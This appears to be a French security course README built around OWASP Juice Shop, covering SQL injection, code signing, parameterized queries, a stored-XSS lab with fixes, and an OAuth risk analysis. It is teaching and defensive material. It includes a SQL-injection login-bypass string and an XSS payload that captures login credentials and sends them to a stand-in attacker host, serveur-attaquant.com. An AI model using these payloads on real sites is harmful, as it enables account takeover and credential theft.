# CESI_C2A_INF48
Cours et TD
## Ressources
Juice Shop Owasp 
https://owasp.org/www-project-juice-shop/

### Database
https://sqlitebrowser.org/

### Installer Juice Shop
Install Docker
- Run command : docker pull bkimminich/juice-shop
- Run command : docker run --rm -p 3000:3000 bkimminich/juice-shop
- Browse to http://localhost:3000 (on macOS and Windows browse to http://192.168.99.100:3000 if you are - using docker-machine instead of the native docker installation)

## Injection

### Injection SQL
https://www.owasp.org/index.php/SQL_Injection
taper dans le login admin@juice-sh.op'-- et n'importe quoi dans le mot de passe

### Burp Suite

https://portswigger.net/burp/communitydownload

## Signature

### dotnet 
- créer une app ou utiliser une app existante

dotnet new wpf -n MonAppDesktop   

- Se rendre dans le répertoire de l'exe
- lancer la commande : $cert = New-SelfSignedCertificate -Type CodeSigning -Subject "CN=MonCertificatTD" -CertStoreLocation "Cert:\CurrentUser\My"
- lancer la commande : Set-AuthenticodeSignature -FilePath ".\MonAppDesktop.exe" -Certificate $cert  


## TD : Remediation

Dans le language que vous connaissez développer un accès simple login / mot de passe avec une base de données et un moteur de recherche.

Sqlite est une base qui peut être utilisé.

Voici comment écrire une requête sécurisée (requête préparée ou paramétrée) avec SQLite dans ces quatre langages.

Le principe est toujours le même : on remplace les variables par des jetons (comme `@` ou `?`) et on transmet les valeurs séparément pour que le moteur SQL les traite comme du texte pur, et non comme du code exécutable.

---

## 1. C# (.NET)

En C#, on utilise généralement les classes `SqliteConnection` et `SqliteCommand` (via le package `Microsoft.Data.Sqlite`). On privilégie les paramètres nommés avec un `@`.

```csharp
using Microsoft.Data.Sqlite;

string connectionString = @"Data Source=C:\data\CESI\myCompany.db";
string username = "admin";
string password = "secret_password";

using (var connection = new SqliteConnection(connectionString))
{
    connection.Open();
    string query = "SELECT * FROM user WHERE username = @username AND password = @password";

    using (var command = new SqliteCommand(query, connection))
    {
        // Association des paramètres de manière sécurisée
        command.Parameters.AddWithValue("@username", username);
        command.Parameters.AddWithValue("@password", password);

        using (var reader = command.ExecuteReader())
        {
            if (reader.HasRows) {
                Console.WriteLine("Connexion réussie !");
            } else {
                Console.WriteLine("Identifiants incorrects.");
            }
        }
    }
}

```

---

## 2. PHP (via PDO)

En PHP, l'extension **PDO** est la méthode recommandée. On utilise des marqueurs de position (`?`) ou nommés (`:username`) associés à `prepare()` et `execute()`.

```php
<?php
$dbPath = 'C:\data\CESI\myCompany.db';
$username = 'admin';
$password = 'secret_password';

try {
    // Connexion à la base SQLite
    $pdo = new PDO("sqlite:" . $dbPath);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Préparation de la requête avec des marqueurs nommés
    $stmt = $pdo->prepare('SELECT * FROM user WHERE username = :username AND password = :password');

    // Exécution en passant les données dans un tableau (protection injection automatique)
    $stmt->execute([
        ':username' => $username,
        ':password' => $password
    ]);

    $user = $stmt->fetch();

    if ($user) {
        echo "Connexion réussie !";
    } else {
        echo "Identifiants incorrects.";
    }
} catch (PDOException $e) {
    echo "Erreur : " . $e->getMessage();
}
?>

```

---

## 3. Java (via JDBC)

En Java, on utilise l'interface `PreparedStatement` fournie par JDBC. Elle gère nativement la neutralisation des injections SQL via le caractère `?`.

```java
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;

public class Login {
    public static void main(String[] args) {
        String url = "jdbc:sqlite:C:/data/CESI/myCompany.db";
        String username = "admin";
        String password = "secret_password";

        String query = "SELECT * FROM user WHERE username = ? AND password = ?";

        try (Connection conn = DriverManager.getConnection(url);
             PreparedStatement pstmt = conn.prepareStatement(query)) {
            
            // Attribution sécurisée des valeurs aux "?" (les index commencent à 1)
            pstmt.setString(1, username);
            pstmt.setString(2, password);

            try (ResultSet rs = pstmt.executeQuery()) {
                if (rs.next()) {
                    System.out.println("Connexion réussie !");
                } else {
                    System.out.println("Identifiants incorrects.");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

---

## 4. VB.NET

Similaire au C#, VB.NET utilise l'écosystème .NET mais avec sa propre syntaxe. On utilise également `Parameters.AddWithValue`.

```vb
Imports Microsoft.Data.Sqlite

Module Module1
    Sub Main()
        Dim connectionString As String = "Data Source=C:\data\CESI\myCompany.db"
        Dim username As String = "admin"
        Dim password As String = "secret_password"

        Using connection As New SqliteConnection(connectionString)
            connection.Open()
            Dim query As String = "SELECT * FROM user WHERE username = @username AND password = @password"

            Using command As New SqliteCommand(query, connection)
                ' Ajout sécurisé des paramètres
                command.Parameters.AddWithValue("@username", username)
                command.Parameters.AddWithValue("@password", password)

                Using reader As SqliteDataReader = command.ExecuteReader()
                    If reader.HasRows Then
                        Console.WriteLine("Connexion réussie !")
                    Else
                        Console.WriteLine("Identifiants incorrects.")
                    End If
                End Using
            End Using
        End Using
    End Sub
End Module

```
## TD Avis Client.
Ajouter sur la page de login un formulaire qui permet de donner un avis. Afficher sous le formulaire l'avis des visiteurs.

1 - Critiquer le concept.

2 - Réaliser un attaque de type XSS avec ce formulaire.

3 - Correction


---

## 1 - Critique du concept

Mélanger des fonctionnalités d'**authentification** (la page de login) et des fonctionnalités de **contenu non approuvé / public** (les avis des visiteurs) est une très mauvaise pratique d'architecture de sécurité.

Voici ce que révèlent les outils de scan :

### Approche SAST (Analyse du code source)

Un outil SAST (comme SonarQube, Semgrep ou Checkmarx) va scanner le code sans l'exécuter. Il lèvera immédiatement des alertes critiques :

* **Violation du principe de moindre privilège / Isolation :** La page de login est la porte d'entrée de l'application. Y insérer un flux de données provenant d'utilisateurs non authentifiés augmente drastiquement la surface d'attaque à un endroit ultra-sensible.
* **Absence de désinfection (Sanitization) :** Le SAST va suivre le chemin de la variable `review` (Source) jusqu'à son affichage dans le DOM ou son stockage en base (Sink). S'il ne détecte pas de fonction de nettoyage ou d'encodage (comme `textContent` ou des fonctions d'échappement HTML), il marquera le code comme **vulnérable aux failles d'injection (XSS/SQL)**.

### Approche DAST (Analyse dynamique / au runtime)

Un outil DAST (comme OWASP ZAP ou Burp Suite) va tester l'application en cours d'exécution en simulant des attaques.

* **Détection de vecteurs XSS Stockés ou Réfléchis :** Le DAST va injecter des payloads dans le champ `review` et analyser les réponses HTTP. S'il voit que ses scripts s'exécutent dans le navigateur, la vulnérabilité est confirmée.
* **Risque de vol de session (Session Hijacking) :** Si un attaquant réussit une XSS sur la page de login, il peut intercepter les identifiants (emails/mots de passe) au moment où les utilisateurs les tapent, ou voler les cookies de session si la page est partagée.

---

## 2 - Réalisation d'une attaque de type XSS (Cross-Site Scripting)

Puisque l'avis est affiché sous le formulaire, si le développeur a utilisé une méthode non sécurisée pour injecter le texte (comme `innerHTML` en JavaScript, ou un affichage brut sans échappement en PHP/Java), la page devient vulnérable.

### Payload XSS pour voler les identifiants en direct :

Voici un exemple d'attaque plus évolué qu'un simple `alert()`. Ce script attend discrètement que la victime tape ses identifiants et les envoie vers un serveur contrôlé par l'attaquant :

```html
<img src="x" onerror="
    const form = document.getElementById('loginForm');
    if(form) {
        form.addEventListener('submit', () => {
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            // Envoi des identifiants volés vers le serveur de l'attaquant
            fetch('https://serveur-attaquant.com/log?u=' + encodeURIComponent(user) + '&p=' + encodeURIComponent(pass));
        });
    }
">

```

**Pourquoi ça marche ?**
La balise `<img>` cherche une image "x" qui n'existe pas. Cela déclenche immédiatement l'événement `onerror`, qui exécute le code JavaScript malveillant en arrière-plan sans que l'utilisateur ne s'en rende compte.

---

## 3 - Correction

Pour valider les rapports SAST et DAST, la correction doit être appliquée à deux niveaux : l'architecture et le code.

### A. Correction architecturale (Recommandée par le DAST/SAST)

* **Séparation des contextes :** Supprimez le formulaire d'avis de la page de login. Les avis doivent être placés dans un espace dédié (ex: un tableau de bord après connexion, ou une page "Livre d'or" totalement isolée).

### B. Correction technique dans le code

#### Côté Front-end (JavaScript)

Pour bloquer l'exécution des scripts injectés, il faut traiter l'avis comme du **texte brut** et non comme du code HTML.

* **À bannir (Vulnérable) :**
```javascript
document.getElementById('displayReview').innerHTML = reviewText;

```


* **Sécurisé (Sûr) :**
```javascript
document.getElementById('displayReview').textContent = reviewText;
// Ou element.innerText

```



#### Côté Back-end (Exemple en Node.js / Express)

Si les avis sont enregistrés dans la base SQLite pour être réaffichés plus tard (XSS Stocké), il faut encoder les caractères spéciaux HTML avant l'affichage. Vous pouvez créer une fonction de nettoyage native :

```javascript
function escapeHTML(str) {
    return str.replace(/[&<>"']/g, function(match) {
        const chars = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return chars[match];
    });
}

// Utilisation avant enregistrement ou affichage
const safeReview = escapeHTML(req.body.review);

```

En appliquant ces corrections, les outils **SAST** ne verront plus de chemin non sécurisé entre l'entrée et la sortie, et les outils **DAST** verront leurs payloads s'afficher inoffensivement sous forme de texte à l'écran (`<script>` s'affichera mot pour mot au lieu de s'exécuter).

## TD Oauth
Ajouter sur la page une authentification via Oauth.

Avant de développer mettre en place une analyse de risques et des mesures de protection.

On peut proposer une authentification via Oauth (google, facebook, github, twitter, linkedin, etc.) et expliquer les avantages et les risques de cette solution.

## Analyse de risques et des mesures de protection

### Le use case : Ajouter une authentification via Oauth

**Risques :**

- **Risque 1 :** Le client n'a pas le droit de choisir son fournisseur d'authentification.
- **Risque 2 :** Le client veut peut-être s'inscrire avec une authentification existante.
- **Risque 3 :** Le tiers peut être innacessible.

**Mesures de protection :**

- **Mesure 1 :** Limitation du choix des fournisseurs d'authentification.
- **Mesure 2 :** Limitation de l'inscription avec des fournisseurs d'authentification existants.
- **Mesure 3 :** Limitation de l'accessibilité des tiers.
- **Mesure 4 :** Prise en compte du coût de l'authentification.
- **Mesure 5 :** Prise en compte de la souveraineté de l'authentification en rapport avec la situation internationale.

### Aspect technique
### Test Pilote : Ajouter une authentification via Oauth
#### Fonctionalité ouverte à une population (10 à 20 utilisateurs)
- Limite à 10 à 20 utilisateurs
- Augmentation du nombre d'utilisateurs en foction de la réussite du test pilote
-Choix du fournisseur d'authentification GitHub en priorité pour la facilité de mise en place
- Mise en place de log spécifique pour la phase de pilotage
- Mise en place de log spécifique pour la phase de production
### Coté front end
- Mise en place de l'authentification via Oauth avec GitHub
- Utilisation d'un lien se connecter seulement
### Coté back end
- Mise en place de l'authentification via Oauth avec GitHub
- gestion des jetons d'authentification en utilisant une librairie de gestion de jetons reconnue et recommandée par GitHub
- Suivre particulièrement les cookies de session et les jetons d'authentification en s'assurant qu'ils soient bien httpOnly et secure et Samesite